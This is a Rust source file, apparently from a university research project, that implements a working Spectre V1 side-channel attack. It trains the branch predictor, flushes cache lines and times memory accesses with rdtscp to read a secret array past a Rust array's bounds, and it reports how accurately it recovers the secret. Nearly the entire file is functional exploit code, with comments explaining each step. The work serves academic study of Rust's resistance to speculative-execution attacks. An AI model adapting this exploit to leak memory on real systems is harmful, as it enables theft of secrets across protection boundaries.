// Spectre V1 in Rust
// 
// From the U-M EECS 573 Project "In Rust We Trust?"
//
// Authors: Christopher Felix <chrisfx@umich.edu>
//          Todd Austin <austin@umich.edu>
//          Donayam Benti <donayam@umich.edu>
//
// Loosely adapted from: https://github.com/yadav-sachin/spectre-attack
//
use std::arch::asm;
use std::arch::x86_64::*;
use rand::Rng;
use std::io;
use std::io::Write;

const NUM_TRIES: u64 = 1000;
const TRAINING_LOOPS: usize = 100;
const ATTACK_LEAP: u64 = 10;
const INBETWEEN_DELAY: u64 = 100;

// x86 read-time-stamp-counter instruction access, returns a 64-bit CPU cycle
// timer, used for high-precision timing of cache hits and misses
pub fn rdtscp() -> u64 {
    let eax: u32;
    let ecx: u32;
    let edx: u32;
    unsafe {
    asm!(
      "rdtscp",
      lateout("eax") eax,
      lateout("ecx") ecx,
      lateout("edx") edx,
      options(nomem, nostack)
    );
    }
    let counter: u64 = (edx as u64) << 32 | eax as u64;
    counter
}

// initialize attack support variables
fn init_attack() -> (Vec<bool>, Vec<u8>) {
    let mut is_attack = vec![false; TRAINING_LOOPS as usize];
    for i in (0..TRAINING_LOOPS).step_by(ATTACK_LEAP as usize) {
        is_attack[i as usize] = true;
    }

    // currently making the read order deterministic, doesn't seem to be
    // a problem
    let mut attack_pattern: Vec<u8> = // (0..=255).collect();
       vec! [133u8, 211, 224, 148, 141, 69, 183, 14, 76, 90, 37, 52, 94, 26, 46, 250, 41, 220, 237, 143, 156, 111, 166, 201, 36, 81, 104, 89, 96, 255, 182, 22, 64, 47, 87, 209, 225, 142, 151, 226, 219, 152, 126, 130, 106, 178, 186, 221, 17, 158, 125, 150, 20, 79, 243, 160, 167, 101, 249, 71, 51, 247, 124, 213, 222, 44, 5, 48, 193, 231, 212, 132, 55, 215, 176, 109, 240, 218, 206, 177, 164, 63, 82, 173, 61, 252, 4, 103, 154, 175, 59, 197, 199, 99, 146, 1, 241, 122, 74, 30, 159, 188, 242, 138, 93, 6, 129, 134, 181, 140, 123, 18, 229, 187, 162, 163, 80, 202, 29, 203, 38, 73, 185, 60, 13, 194, 190, 184, 62, 214, 161, 95, 196, 0, 21, 58, 53, 239, 227, 169, 149, 34, 45, 43, 165, 248, 200, 195, 8, 136, 98, 253, 144, 192, 121, 11, 9, 170, 15, 35, 57, 147, 23, 216, 65, 28, 157, 85, 107, 232, 174, 88, 16, 223, 67, 135, 25, 112, 86, 97, 7, 155, 208, 145, 70, 168, 246, 230, 72, 10, 210, 31, 27, 40, 2, 245, 233, 205, 12, 128, 75, 33, 102, 172, 153, 139, 198, 39, 131, 100, 191, 118, 179, 254, 84, 3, 207, 77, 19, 92, 32, 113, 228, 91, 78, 244, 171, 120, 114, 105, 235, 110, 251, 83, 180, 236, 49, 217, 204, 24, 115, 117, 54, 127, 238, 119, 108, 66, 189, 234, 68, 116, 137, 42, 56, 50];

    // STRANGELY, the attack doesn't work if the next three lines are deleted, likely due
    // to its affect on the storage allocators ?!?!?!
    let mut rng = rand::thread_rng();
    println!("is_attack = {:?}", is_attack);
    println!("attack_pattern = {:?}", attack_pattern);

    (is_attack, attack_pattern)
}

//
//  Spectre V1 Attack Gadget
//
//  This function performs the Spectre V1 attack, successfully reading past
//  the end of the array arr1[] to access the unrelated array secret[],
//  details are below in the code
//
#[inline(never)]
pub fn fetch_function(arr1: &Vec<u8>, arr1_len: &mut usize, arr2: &[u8], idx: usize) -> u8
{
    // note that arr1 is passed in as a Vec, which puts the size of the
    // structure into memory, if you pass arr1 as a simple array, the size is
    // a constant, and you won't be able to delay the branch that checks if
    // the array access is overflowing!

    let mut val: usize = 0;

    // redundant check to make sure that the Spectre array access that
    // violates the array boundaries doesn't generate an exception in the
    // non-speculative path of the program, this then requires that this
    // Spectre V1 attack mispeculate past two branches: 1) the branch in the
    // if statement below and 2) the internal compiler branch to check the
    // arr1 slice access inside the scope of the if statement
    if idx < *arr1_len
    {
      // get the array value, note that 1 out of 10 times this will be an
      // access to the secret array using an out-of-bounds idx value, note
      // that the other 9 accesses train the branch above and the the branch
      // below that checks that the arr1 access is in bounds, if both
      // mispeculate (and they will since the branch predictors just saw
      // 9 times in a row that both branches were NOT taken), then the illegal
      // access past the end of the rust array WILL HAPPEN 
      val = arr1[idx] as usize;

      // now communicate the value read out to arr2, arr2 is just a huge array
      // that is displaced from the cache before this function is called, by
      // accessing it at val*512, we are assigning a specific cache block in
      // the array to 'a', 'b', 'c', etc... Later we will read back the array
      // to see check letter-associated line got referenced, and that will
      // COMMUNICATE out the value of the ILLEGALLY read rust array value
      return arr2[val * 512]
    }

    // quick note, while we are doing "stupid microarchitecture tricks" here,
    // we still need everything to compute a real value or the incredibly
    // smart rustc compiler will silently remove dead code, that is why you'll
    // see everything doing non-commutative non-associative computation along
    // with the microarchitecture tricks
    0
}

//
// This function performs a single character read at the ILLEGAL arr1 address
// arr1[target_idx], which surprise is actually an index past the end of arr1
// into the secret array secret[]
#[inline(never)]
pub fn read_memory_byte(target_idx: usize, is_attack: &Vec<bool>, arr1: &Vec<u8>, arr1_len: &mut usize, arr2: &mut [u8], attack_pattern: &Vec<u8>, results: &mut [u32], idx: usize) -> u8 {

    let mut sum: u8 = 0;

    for elem in results.iter_mut() { *elem = 0; }

    for attempt in (1..NUM_TRIES).rev() {

        // flush arr2 from cache memory
        for i in 0..256 {
            unsafe { _mm_clflush(&arr2[i * 512]); }
        }

        let train_idx: usize = (attempt as usize) % arr1.len();
        // println!("train_idx #{}...", train_idx);

        for i in (0..TRAINING_LOOPS).rev()
        {
          unsafe { _mm_clflush(arr1_len as *const usize as *const u8); }
          // This loop executes the delay inbetween the successive training loops
          for _ in 0..INBETWEEN_DELAY
          {
            sum = sum - (sum ^ 0x5a);
          }
          unsafe { _mm_mfence(); }

          // We should avoid the if-else condition here, as the if-else invokes the use of branch predictor here, which will then detect our logic here
          let merged_idx = (is_attack[i] as usize) * target_idx + (!is_attack[i] as usize) * train_idx;
          // println!("target address = {:#02x}", arr1.as_ptr() as usize + merged_idx);

          unsafe { _mm_clflush(arr1 as *const Vec<u8> as *const usize as *const u8); }
          unsafe { _mm_mfence(); }

          /* Call the victim function with the training_x (to mistrain branch predictor) or target_x (to attack the SECRET address) */
          sum = fetch_function(arr1, arr1_len, arr2, merged_idx) - sum;
        }
        // unsafe { _mm_prefetch(&(arr2[idx * 512] as i8), _MM_HINT_T0); }

        // determine accessed line
        /* Here I have set a timing attack for each character */
        for i in (0..=255).rev() {
            /* The ATTACK PATTERN is set randomly that the system does not detect the pattern of attack (stride prediction by the system) */
            let curr_char: u8 = attack_pattern[i];  // ATTACK_PATTERN decides which character I will be setting the timing attack for
            let ival = (curr_char as usize) * 512;
            let time1 = rdtscp();
            let val = arr2[ival];  // address location which would have been prefetched, if the branch predictor prefetched this 'character'
            let time_diff = rdtscp() - time1; /* Read the timer and see what is the difference in earlier junk (fetched from CACHE) and this address*/
            sum = val - sum;  // address location which would have been prefetched, if the branch predictor prefetched this 'character'
            results[curr_char as usize] += time_diff as u32;
            // println!("time_diff = {}", time_diff);
            // if time_diff <= CACHE_HIT_THRESHOLD {
            //     results[curr_char as usize] = results[curr_char as usize] + 1; /* cache hit - add +1 to score for this value */
        }

    }

    sum
}


/*
struct HackData {
  arr1: [u8; 16],
  pad1: [u8; 64],
  secret: [u8; 20],
  pad2: [u8; 64],
  arr2: [u8; 256 * 512],
  pad3: [u8; 64],
  arr1_len: usize, 
  pad4: [u8; 64],
}
*/


fn main() {

/*
    let mut hackdata = HackData {
      arr1: [17, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2],
      pad1: [0; 64],
      secret: [72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32],
      pad2: [0; 64],
      arr2: [0; 256 * 512],
      pad3: [0; 64],
      arr1_len: 16,
      pad4: [0; 64],
    };
*/

    // let mut arr1: [u8; 16] = [17, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2];
    let mut arr1 = vec! [17u8, 8, 24, 14, 3, 28, 6, 19, 9, 25, 11, 30, 5, 20, 16, 2];
    let mut secret: [u8; 20] = [72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 32, 72, 101, 108, 108, 111, 32, 32, 32];

    let count1 = rdtscp();
    let count2 = rdtscp();
    println!("The timer values are {} and {} (diff = {})", count1, count2, count2-count1);

    // This is where you would set up shared memory for arr1 and arr2, as in the C++ code.
    // You'll need to replace these placeholders with actual memory setup.
    let mut arr2: [u8; 256 * 512] = [0; 256 * 512]; // Placeholder, initialize with appropriate values
    let mut results: [u32; 256] = [0; 256];
    let mut target_idx: usize;

    unsafe {
        target_idx = (secret.as_ptr().offset_from(arr1.as_ptr())) as usize; /* Its value is the difference in the address of SECRET KEY and arr1*/
        println!("Distance to secret array = {} ({:#02x} -> {:#02x})", target_idx, arr1.as_ptr() as usize, secret.as_ptr() as usize);
    }

    // The init function will initialize the IS_ATTACK and ATTACK_PATTERN
    let (is_attack, attack_pattern) = init_attack();

    // set all values of arr2 as 1
    for i in 0..arr2.len() {
        arr2[i] = 1; /* write to arr2 so in RAM not copy-on-write zero pages */
    }

    // create an unknown-sized slice of arr1
    let mut rng = rand::thread_rng();
    let arr1_slice = &arr1[..((rng.gen::<usize>() % (arr1.len()-1)))+1];
    let mut arr1_len: usize = arr1_slice.len();

    let mut correct_letters: usize = 0;
    let mut total_letters: usize = 0;

    for _ in 0..20 {
      // println!("Reading {} bytes from target ::", arr1.len());
      let mut guessed_secret = String::new(); // This will store the most-likely value of the SECRET_KEY overall
      let mut sum: u8 = 0;
      for i in 0..secret.len() {
          // println!("Reading at Target Address = {}", target_idx + i);
  
          sum = read_memory_byte(target_idx + i, &is_attack, &arr1, &mut arr1_len, &mut arr2, &attack_pattern, &mut results, attack_pattern[0] as usize) - sum;
          // println!("results = {:?}", results);
          // results[b'q' as usize] = 999;
  
          /* get the most likely character */
          let mut most_likely_char: u8 = b'?';
          let mut min_result: u32 = 9999999;
          for i in 0..256 {
             let curr_char: u8 = attack_pattern[i];
             if results[curr_char as usize] < min_result && curr_char > 31 && curr_char < 127 {
               min_result = results[curr_char as usize];
               most_likely_char = curr_char;
             }
          }
          println!("Char: '{}', Score: {}, Sum: {}", most_likely_char as char, min_result, sum);
          // print!("."); io::stdout().flush().unwrap();
  
          guessed_secret.push(most_likely_char as char);
      }

      println!("Guessed secret = {}", guessed_secret);

      total_letters += guessed_secret.len();
      for i in 0..guessed_secret.len() {
        if secret[i] == guessed_secret.as_bytes()[i]
        {
          correct_letters += 1;
        }
      }
    }

    println!("Final stats: {}% correct guesses. ({} out of {} letters).", (correct_letters as f64)/(total_letters as f64)*100.0, correct_letters, total_letters);
}

